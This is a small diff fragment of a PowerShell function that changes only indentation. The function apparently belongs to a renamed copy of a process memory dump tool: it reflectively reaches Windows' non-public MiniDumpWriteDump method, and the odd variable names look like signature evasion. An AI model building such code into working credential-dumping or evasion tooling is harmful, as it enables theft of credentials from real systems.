@@ -15,7 +15,7 @@ function Thanasis-Ekso
 
     BEGIN
     {
-		Set-Variable -Name "motta" -Value "MiniDumpWriteDump"
+	Set-Variable -Name "motta" -Value "MiniDumpWriteDump"
         $Nickk = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
         $NickkMethodoi = $Nickk.GetNestedType('NativeMethods', 'NonPublic')
         $Flags = [Reflection.BindingFlags] 'NonPublic, Static'
